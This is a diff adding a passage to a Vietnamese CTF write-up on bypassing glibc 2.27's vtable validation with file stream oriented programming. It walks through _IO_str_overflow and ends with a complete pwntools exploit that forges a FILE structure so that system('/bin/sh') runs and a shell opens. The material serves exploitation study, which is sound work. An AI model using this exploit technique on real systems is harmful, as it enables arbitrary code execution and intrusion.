@@ -1982,3 +1982,170 @@ p.interactive()
 ```
 
 ![here](/assets/images/flagkaka.png)
+
+## Bypass IO_validate_vtable
+
+- main: ta có libc_address được leak sẵn ở bài này , tiếp nó đọc dữ liệu vào fp và dùng ```fclose``` để đóng tệp và end
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  init(argc, argv, envp);
+  fp = fopen("/dev/urandom", "r");
+  printf("stdout: %p\n", _bss_start);
+  printf("Data: ");
+  read(0, fp, 0x12CuLL);
+  fclose(fp);
+  return 0;
+}
+```
+
+- phiên bản libc ở bài này là 2.27 , và tính năng xác thực vtables đã được thêm vào kể từ glibc 2.27 
+- ở các phiên bản trước do tính thiếu xác thực này nên ta có thể ghi đè vtable của io_file_struct 1 cách dễ dàng tuy nhiên ở bài này thì không
+
+- IO_validate_vtable() : hàm này xác minh bằng cách gọi 1 hàm nếu địa chỉ vtable không có trong vùng  ```_libc_IO_vtables```
+
+```c
+if (__glibc_unlikely (offset >= section_length))              
+    _IO_vtable_check ();
+```
+
+- _IO_vtable_check() : nếu quá trình xác định không thành công thì nó sẽ thực thi ``` __libc_fatal ("Fatal error: glibc detected an invalid stdio handle\n")```
+
+```c
+void attribute_hidden
+_IO_vtable_check (void)
+{
+#ifdef SHARED
+  /* Honor the compatibility flag.  */
+  void (*flag) (void) = atomic_load_relaxed (&IO_accept_foreign_vtables);
+#ifdef PTR_DEMANGLE
+  PTR_DEMANGLE (flag);
+#endif
+  if (flag == &_IO_vtable_check)
+    return;
+  {
+    Dl_info di;
+    struct link_map *l;
+    if (!rtld_active ()
+        || (_dl_addr (_IO_vtable_check, &di, &l, NULL) != 0
+            && l->l_ns != LM_ID_BASE))
+      return;
+  }
+#else /* !SHARED */
+  if (__dlopen != NULL)
+    return;
+#endif
+  __libc_fatal ("Fatal error: glibc detected an invalid stdio handle\n");
+}
+```
+
+- vì vậy để bypass đoạn check này , ta phải sử dụng các function tồn tại trong khu vực ``` _libc_io_vtables```
+- 2 hàm ```_io_str_overflow và _io_str_finish``` sẽ có thể bypass thành công trong trường hợp này
+
+### _IO_str_overflow()
+
+
+
+```c
+int
+_IO_str_overflow (_IO_FILE *fp, int c)
+{
+  int flush_only = c == EOF;
+  _IO_size_t pos;
+  if (fp->_flags & _IO_NO_WRITES)
+      return flush_only ? 0 : EOF;
+  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
+    {
+      fp->_flags |= _IO_CURRENTLY_PUTTING;
+      fp->_IO_write_ptr = fp->_IO_read_ptr;
+      fp->_IO_read_ptr = fp->_IO_read_end;
+    }
+  pos = fp->_IO_write_ptr - fp->_IO_write_base;
+  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
+    {
+      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
+    return EOF;
+      else
+    {
+      char *new_buf;
+      char *old_buf = fp->_IO_buf_base;
+      size_t old_blen = _IO_blen (fp);
+      _IO_size_t new_size = 2 * old_blen + 100;
+      if (new_size < old_blen)
+        return EOF;
+      new_buf
+        = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
+```
+
+- ta sẽ tìm hiểu chi tiết và khai thác nó
+
+
+```cs
+new_buf
+        = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
+```
+
+- _io_str_overflow() ở cuối hàm gọi và thực thi ```_s._allocate_buffer``` , vậy nếu ta thay thế nó thành system thì sao? ta hoàn toàn thể khai thác thành công , trước hết cần biết đối số truyền vào hàm này 
+
+```cs
+#define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)
+size_t old_blen = _IO_blen (fp);
+_IO_size_t new_size = 2 * old_blen + 100;
+if (new_size < old_blen)
+   return EOF;
+```
+
+- ta có thể control được new_size ở trên nếu ta control được ```(fp)->_IO_buf_end - (fp)->_IO_buf_base```
+
+- Nói cách khác, nếu bạn có thể điều khiển ```_S._ALLOCATE_BUFFER, _IO_BUF_END, _IO_BUF_BASE,``` bạn có thể chạy lệnh mong muốn.
+- ở đây ta cũng cần bỏ qua các điều kiện khác :
+
+Biến flush_only sử dụng trong câu lệnh if có giá trị mặc định là 0, và nếu tóm tắt câu lệnh if thì pos >= _IO_blen(fp). Do đó, nếu khởi tạo _IO_write_base là 0, thì _IO_write_ptr sẽ trở thành pos và có thể dễ dàng vượt qua câu lệnh so sánh để gọi con trỏ hàm.
+
+
+- ta sẽ setup như sau: 
+
+```cs
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./bypass_valid_vtable_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-2.27.so")
+
+context.binary = exe
+
+p = process()
+#p = remote('host1.dreamhack.games', 14463)
+
+p.recvuntil(b'stdout: ')
+libc.address = int(p.recvline()[:-1],16) - libc.sym._IO_2_1_stdout_
+io_files_jump = libc.sym._IO_file_jumps
+io_str_overflow = io_files_jump + 0xd8
+
+log.info(f'libc: {hex(libc.address)}')
+
+fake_vtable = io_str_overflow - 16
+binsh = next(libc.search(b'/bin/sh\x00'))
+fp = exe.sym.fp
+
+pl = p64(0)*5 # flags , _io_read_ptr , _io_read_end , _io_read_base , _io_write_base
+pl += p64((int((binsh - 100)/2))) # _IO_write_ptr
+pl += p64(0)*2 # _io_write_end , _io_buf_base
+pl += p64((int((binsh-100)/2))) # _io_buf_end
+pl += p64(0)*8 # save_base , backup_base , save_end , marker , chain , fileno , odd_offset
+pl += p64(fp+0x80)  #lock
+pl += p64(0)*9
+pl += p64(fake_vtable)  #io file jump overwrite
+pl += p64(libc.sym.system)  # fp->_s.allocate_buffer rip
+
+
+p.sendline(pl)
+p.interactive()
+```
+
+- như ta đã nói ta cần control io_buf_end và buf_base làm đối số  , và setup _IO_write_base là 0 và _IO_write_ptr  để bypass đoạn check , ta cũng cần setup _lock thành địa chỉ có thể ghi
+
+![here](/assets/images/fsop1.png)
